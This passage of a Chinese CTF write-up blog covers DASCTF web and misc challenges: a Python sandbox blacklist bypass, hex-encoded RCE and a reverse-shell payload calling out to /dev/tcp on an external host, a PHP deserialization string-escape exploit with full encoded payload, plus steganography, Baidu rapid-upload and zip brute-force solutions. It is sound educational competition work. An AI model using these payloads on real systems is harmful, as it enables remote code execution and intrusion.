class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这题有black_list，不过有回显，（这样就不用答题了</p>
+<p>想用题1的<code>open().read()</code>来读，但是发现<code>read</code>被ban了</p>
+<p>这里可以利用<code>__class__</code>和<code>vars()</code>函数或者<code>__dict__</code>属性来实现绕过，这三个东西都没过滤，而且<code>vars()</code>和<code>__dict__</code>用起来是一样的效果</p>
+<blockquote>
+<p>这里不清楚的话可以分别执行一下下面的东西看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__</span><br><span class="line">vars(open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__)</span><br><span class="line">vars(open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__)[&#39;read&#39;]</span><br><span class="line">open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__.__dict__[&#39;read&#39;]</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>因为这里得到的<code>read</code>方法实际上是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxx</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self)</span>:</span></span><br><span class="line">    	xxx</span><br></pre></td></tr></table></figure>
+
+<p>需要传入一个self给它，所以需要再输入一遍<code>open(&#39;/flag&#39;,&#39;r&#39;)</code></p>
+<p>所以新的payload就出来了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1,open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__.__dict__[&#39;re&#39;+&#39;ad&#39;](open(&#39;&#x2F;flag&#39;,&#39;r&#39;))</span><br><span class="line">1,vars(open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__)[&#39;re&#39;+&#39;ad&#39;](open(&#39;&#x2F;flag&#39;,&#39;r&#39;))</span><br></pre></td></tr></table></figure>
+
+<p>提交得到flag</p>
+<blockquote>
+<p>DASCTF{1cd78b58153d9ef4a7da1f5ca15ef7e8}</p>
+</blockquote>
+<p>因为有回显，所以后面把源码全部扒下来了，研究了一下发现还可以<code>rce</code>、<code>反弹shell</code></p>
+<p>扒下来的blacklist：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">black_list = [ <span class="string">'os'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'system'</span>,<span class="string">'if'</span>, <span class="string">'for'</span>,</span><br><span class="line">             <span class="string">'subprocess'</span>, <span class="string">'file'</span>, <span class="string">'builtins'</span>, <span class="string">'compile'</span>, <span class="string">'execfile'</span>, <span class="string">'from_pyfile'</span>, <span class="string">'config'</span>,</span><br><span class="line">             <span class="string">'local'</span>, <span class="string">'self'</span>,<span class="string">'enter'</span>,<span class="string">'%'</span>,<span class="string">'or'</span>,<span class="string">'ls'</span>,<span class="string">'sys'</span>,<span class="string">'globals'</span>,<span class="string">'read'</span>,<span class="string">'popen'</span>]</span><br></pre></td></tr></table></figure>
+
+<p>研究了一下，发现它没有过滤<code>exec</code>，所以我们可以简单地构造一些东西来实现命令执行</p>
+<p>RCE payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,exec(<span class="string">'o'</span>+<span class="string">'s.sy'</span>+<span class="string">'stem("sleep 10")'</span>)</span><br><span class="line"><span class="comment"># 提交上去之后明显地延时了10秒，但是这样写不方便编码，所以我们可以利用bytes来编码</span></span><br><span class="line"><span class="number">1</span>,exec(bytes([<span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">39</span>, <span class="number">41</span>]).decode())</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="number">1</span>,exec(bytes.fromhex(<span class="string">'6f732e73797374656d2827736c6565702031302729'</span>).decode())</span><br></pre></td></tr></table></figure>
+
+<p>但是因为<code>exec</code>不会返回命令执行的结果，所以我们利用上<code>open().write()</code>来反弹shell(当然直接用RCE写也可以</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,open(&#39;&#x2F;tmp&#x2F;c.sh&#39;,&#39;w&#39;).write(&#39;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;jeffz.cn&#x2F;6009 0&gt;&amp;1&#39;),exec(bytes.fromhex(&#39;6f732e73797374656d28272f62696e2f62617368202f746d702f632e73682729&#39;).decode())</span><br></pre></td></tr></table></figure>
+
+<h3 id="phpuns"><a href="#phpuns" class="headerlink" title="phpuns"></a>phpuns</h3><p>这题给了源码</p>
+<p>主要看<code>index.php</code>、<code>functions.php</code>、<code>class.php</code>、<code>info.php</code>这几个，将流程简化一下如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//function.php的一些主要函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0*\0'</span>, $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduce</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($data, <span class="string">'c2e38'</span>)!==<span class="keyword">False</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'exit'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username;</span><br><span class="line">    <span class="keyword">protected</span> $password;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username, $password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c2e38;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($c2e38)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c2e38 = $c2e38;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;c2e38, <span class="string">"admin"</span>)===<span class="keyword">False</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">"must be admin"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">"good luck"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c2e38;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($c2e38)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c2e38 = $c2e38;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_c2e38</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;c2e38;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $tmp = <span class="keyword">$this</span>-&gt;get_c2e38();</span><br><span class="line">        $tmp();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'test'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'test'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        var_dump(system(<span class="string">'cat /flag'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>] ;</span><br><span class="line">    $user = <span class="keyword">new</span> User($username, $password);</span><br><span class="line">    $_SESSION[<span class="string">'info'</span>] = add(serialize($user));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里实际上会跳转到info.php，下面是info.php的部分源码</span></span><br><span class="line">    check(reduce($_SESSION[<span class="string">'info'</span>]));</span><br><span class="line">    $tmp = unserialize(reduce($_SESSION[<span class="string">'info'</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($tmp-&gt;get_admin() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You must be admin'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很显然这是反序列化题</p>
+<p><code>Hacker_A</code>、<code>Hacker_B</code>、<code>Hacker_C</code>这三个可以这样构造在一起，达到执行<code>cat /flag</code>的目的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c = <span class="keyword">new</span> Hacker_C();</span><br><span class="line">$b = <span class="keyword">new</span> Hacker_B($c);</span><br><span class="line">$a = <span class="keyword">new</span> Hacker_A($b);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:8:"Hacker_A":1:&#123;s:5:"c2e38";O:8:"Hacker_B":1:&#123;s:5:"c2e38";O:8:"Hacker_C":1:&#123;s:4:"name";s:4:"test";&#125;&#125;&#125; 一共103个字符</span></span><br></pre></td></tr></table></figure>
+
+<p>再把正常的<code>User</code>打出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:8:&quot;username&quot;;s:11:&quot;%00*%00password&quot;;s:8:&quot;password&quot;;s:8:&quot;%00*%00admin&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>仔细看这个函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduce</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会发现它将五个字符替换成了三个字符，可以利用它达到字符逃逸，吞掉<code>username</code>后面的任意字符</p>
+<p>很显然这里要吞掉的字符是<code>&quot;;s:11:&quot;%00*%00password&quot;;s:8:&quot;</code>，来达成注入的目的。</p>
+<p>因为我们需要注入的东西一共大于100个字符，所以需要吞掉的字符是<code>&quot;;s:11:&quot;%00*%00password&quot;;s:xxx:&quot;</code>这么多，也就是28位</p>
+<p>28/(5-3)=14，需要构造14个<code>\0*\0</code></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password&#x3D;&quot;;s:11:&quot;%00*%00password&quot;;O:8:&quot;Hacker_A&quot;:1:&#123;s:5:&quot;c2e38&quot;;O:8:&quot;Hacker_B&quot;:1:&#123;s:5:&quot;c2e38&quot;;O:8:&quot;Hacker_C&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;&#125;&#125;&#125;;s:8:&quot;%00*%00admin&quot;;i:1;&#125;&amp;submit&#x3D;Login</span><br></pre></td></tr></table></figure>
+
+<p>当然，我们还需要绕过<code>check</code></p>
+<p>这里可以利用大<code>S</code>的特性将字符用16进制表示来绕过，最终编码后的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;u%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0&amp;password&#x3D;%22;S:11:%22%5C00*%5C00password%22;O:8:%22Hacker_A%22:1:%7BS:5:%22%5C632e38%22;O:8:%22Hacker_B%22:1:%7BS:5:%22%5C632e38%22;O:8:%22Hacker_C%22:1:%7Bs:4:%22name%22;s:4:%22test%22;%7D%7D%7D;S:8:%22%5C00*%5C00admin%22;i:1;%7D&amp;submit&#x3D;Login</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>DASCTF{7463ace9d0b8a98aa0d8a4ed7038e590}</p>
+</blockquote>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="cryptographic-call"><a href="#cryptographic-call" class="headerlink" title="cryptographic_call"></a>cryptographic_call</h3><p>题目给了一串信息<code>PiTXPBoBd3OVOMdheMGSOZXXeJXXOJ1ge64WPMGBc3cCPJKDc7W=.</code>、一张图片和一个没什么用的tip:<code>secret is in the picture but does not destroy the picture</code></p>
+<p><img src="https://i.loli.net/2020/06/27/yH9n1gXV8WAx36Y.png" alt="image.png"></p>
+<p>很明显可以看到这张图片有一些水纹一样的水印，但是不知道是什么隐写</p>
+<p>给的那串信息长得像base64编码，但是解码出来是乱码</p>
+<p>然后知道了这个工具 <span class="exturl" data-url="aHR0cDovL251bGxpY2UuY29tL2ltYWdlaW4=">http://nullice.com/imagein<i class="fa fa-external-link-alt"></i></span></p>
+<p>把图片拉进去解出来了下面的东西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789abcdefGHIJKLMNOPQrstuvwXYZghijklmnopqRSTUVW*ABCEDF@xyz</span><br></pre></td></tr></table></figure>
+
+<p>一共64位，将其替换为base64的码表，将信息解码得到flag</p>
+<blockquote>
+<p>flag{7463ace9d0b8a98aa0d8a4ed7038e590}</p>
+</blockquote>
+<h3 id="PhysicalHacker"><a href="#PhysicalHacker" class="headerlink" title="PhysicalHacker"></a>PhysicalHacker</h3><p>队里大哥做的（等有空再自己看看），SSID密码是66666666，然后提取流量，获得一堆空白字符</p>
+<p>一开始以为是whitespace语言，但是发现编译不了。</p>
+<p>然后用 <span class="exturl" data-url="aHR0cDovL3d3dy5kYXJrc2lkZS5jb20uYXUvc25vdy9pbmRleC5odG1s">http://www.darkside.com.au/snow/index.html<i class="fa fa-external-link-alt"></i></span> 这个解出了一串东西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZZANFZTUICOMVYHWNRXGBRDCNBXGI4GCZBZHEYDEYLFMNRGCMZSMUZDEZTBGRTDMYTEPUQGG33OM5ZGCZDVNRQXI2LPNZZSCIJB</span><br></pre></td></tr></table></figure>
+
+<p>用CyberChef解一下（base32）就出来了</p>
+<blockquote>
+<p>Nep{670b14728ad9902aecba32e22fa4f6bd}</p>
+</blockquote>
+<h3 id="BaiduYun-amp-Gcode"><a href="#BaiduYun-amp-Gcode" class="headerlink" title="BaiduYun&amp;Gcode"></a>BaiduYun&amp;Gcode</h3><p>题目给了百度网盘本地的一堆sqlite3数据库</p>
+<p>其中<code>BaiduYunCacheFileV0.db</code>里面有百度网盘的目录信息</p>
+<p>提供了文件的<code>md5</code>、<code>文件大小</code>等，根据文件名称可以发现都是比赛平台（X计划平台）的网页资源文件，将平台的资源文件下载下来比对，发现<code>xshadow.png</code>这个文件是不一样的</p>
+<p>现在就是要想办法获得这个不一样的文件</p>
+<p>然后看这篇东西 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIxMjc1MzY1">https://www.zhihu.com/question/21275365<i class="fa fa-external-link-alt"></i></span></p>
+<p>知道了百度网盘的秒传技术，这里可以通过抓包来进行协议分析，然后用fiddler或者burp改包，但是，有现成的轮子干嘛不用？</p>
+<p>刚好前段时间下载了<code>BaiduPCS-Go</code>可以实现手动快传（原作者的github库好像删库了，不过有人重新上传了 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZlbGl4b25tYXJzL0JhaWR1UENTLUdv77yJ">https://github.com/felixonmars/BaiduPCS-Go）<i class="fa fa-external-link-alt"></i></span></p>
+<p>这个软件的<code>rapidupload</code>命令可以实现手动上传，需要提供文件的<code>md5</code>，<code>文件大小</code>，<code>文件的前256kb切片的md5</code></p>
+<p>这里我们只有<code>256kb的md5</code>是不知道的，但是我们可以将平台下载下来的那个文件的前256kb的md5来进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dd if&#x3D;xshadow.png of&#x3D;xshadow-slip.png count&#x3D;512 bs&#x3D;512</span><br><span class="line">md5sum xshadow-slip.png</span><br></pre></td></tr></table></figure>
+
+<p>获取到md5，然后打开软件，执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rapidupload -length&#x3D;30038207 -md5&#x3D;72b6273dc5c54e8af2490e4acd3a6a3f -slicemd5&#x3D;e973409c4ac718e158be4492ab5d9999 &#x2F;xshadow.png</span><br></pre></td></tr></table></figure>
+
+<p>成功转存，然后下载下来一个28.6MB的图片，用<code>binwalk</code>分离出一个压缩包，里面是gcode代码文件</p>
+<p>看到第一行<code>;Generated with Cura_SteamEngine 18.11.13</code>，猜测是3D打印的gcode代码</p>
+<p>然后就是找能模拟gcode代码，生成模型的工具了</p>
+<p>然后发现大部分的在线工具都卡的要死，最后找到一个能用的<span class="exturl" data-url="aHR0cDovL2djb2RlLndzLw==">http://gcode.ws/<i class="fa fa-external-link-alt"></i></span></p>
+<p><img src="https://i.loli.net/2020/06/27/SGni8retFOC9IE1.png" alt="image.png"></p>
+<p>还有一个本地的软件能查看——<code>Repetier-Host</code></p>
+<p><img src="https://i.loli.net/2020/06/27/4XuMlF35LJWdDk9.png" alt="image.png"></p>
+<p>然后人肉ocr得到flag（队友拿小号拿了一血hhh</p>
+<blockquote>
+<p>3f09a046774a4c75885e6fb84a95650e</p>
+</blockquote>
+<h3 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h3><p>听说是安恒四月赛的原题，等我有空再做做看</p>
+<blockquote>
+<p>flag{4a02f6dc603c377a234df479609d237c}</p>
+</blockquote>
+<h3 id="透明度"><a href="#透明度" class="headerlink" title="透明度"></a>透明度</h3><p>把图片下载下来很容易发现顶上有东西，根据题目联想到透明度数据，然后编写脚本提出来看看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">'Rgba.png'</span>)</span><br><span class="line">x,y = img.size</span><br><span class="line">alphas = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(y):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(x):</span><br><span class="line">        color = img.getpixel((j,i))</span><br><span class="line">        alpha = color[<span class="number">-1</span>]</span><br><span class="line">        alphas.append(alpha)</span><br><span class="line"></span><br><span class="line">print(alphas)</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80, 75, 3, 4, 20, 0, 1, 0, 8, 0, 154, 118, 179, 80, 196, 215, 223, 133, 51, 0, 0, 0, 40, 0, 0, 0, 15, 0, 0, 0, 195, 220, 194, 235, 202, 199, 110, 101, 112, 95, 95, 46, 116, 120, 116, 81, 81, 66, 214, 29, 242, 220, 165, 170, 77, 21, 28, 177, 90, 190, 175, 38, 113, 168, 169, 185, 54, 109, 52, 135, 77, 80, 156, 110, 169, 219, 205, 37, 56, 37, 157, 112, 115, 220, 226, 17, 237, 168, 138, 139, 226, 25, 121, 103, 185, 136, 80, 75, 1, 2, 63, 0, 20, 0, 1, 0, 8, 0, 154, 118, 179, 80, 196, 215, 223, 133, 51, 0, 0, 0, 40, 0, 0, 0, 15, 0, 36, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 195, 220, 194, 235, 202, 199, 110, 101, 112, 95, 95, 46, 116, 120, 116, 10, 0, 32, 0, 0, 0, 0, 0, 1, 0, 24, 0, 32, 115, 214, 28, 170, 45, 214, 1, 138, 213, 252, 200, 170, 45, 214, 1, 7, 238, 176, 212, 229, 44, 214, 1, 80, 75, 5, 6, 0, 0, 0, 0, 1, 0, 1, 0, 97, 0, 0, 0, 96, 0, 0, 0, 0, 0</span><br></pre></td></tr></table></figure>
+
+<p>因为这些数据有大有小，不像是Ascii码，所以转成hex看看，然后发现是zip文件</p>
+<p><img src="https://i.loli.net/2020/06/27/UFZARXQBE9N3S2k.png" alt="image.png"></p>
+<p>提出来，压缩包里有个文件，名字是<code>密码是nep__.txt</code></p>
+<p>显而易见了，生成个字典然后爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">print(string.printable)</span><br><span class="line"></span><br><span class="line">pa=<span class="string">'nep'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'d.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            f.write(pa+i+j+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/06/27/zNAvgeHB48jEIih.png" alt="image.png"></p>
+<p>解压得到flag</p>
+<blockquote>
+<p>a22a96d7fc5dfd2182c593630851e44fed0adbe6</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>坚持原创技术分享,您的支持将鼓励我继续创作!</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="Jeff 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Jeff 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+              <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+              <a href="/tags/DASCTF/" rel="tag"><i class="fa fa-tag"></i> DASCTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/06/01/RCTF2020-Web-Misc/" rel="prev" title="RCTF2020_Web&Misc">
+      <i class="fa fa-chevron-left"></i> RCTF2020_Web&Misc
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/06/29/0ctf2020/" rel="next" title="0CTF/TCTF 2020">
